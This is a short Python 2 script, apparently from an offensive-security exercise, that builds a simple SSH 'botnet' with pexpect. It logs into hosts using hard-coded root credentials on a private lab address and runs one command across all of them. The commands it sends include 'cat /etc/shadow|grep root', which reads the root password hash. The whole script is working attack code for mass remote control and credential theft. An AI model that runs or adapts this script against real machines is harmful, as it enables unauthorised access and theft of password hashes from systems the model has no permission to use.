#!/usr/bin/python
# -*- coding: utf-8 -*-
import optparse
from pexpect import pxssh

class Client():
	"""docstring for Client"""
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password  = password
		self.session = self.connect()


	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host,self.user,self.password)
			return s

		except Exception, e:
			print str(e)
			print '[-]Error Connecting'


	def sendCommand(self,cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before


def botnetCommand(command):
	for client in botNet:
		ouput = client.sendCommand(command)
		print '[*]Output from ' + client.host
		print '[+]' + ouput

def addClient(host,user,password):
	client = Client(host,user,password)
	botNet.append(client)

botNet = []
addClient('192.168.56.102', 'root', 'toor')
addClient('192.168.56.102', 'root', 'toor')
addClient('192.168.56.102', 'root', 'toor')

botnetCommand('uname -v')
botnetCommand('cat /etc/shadow|grep root')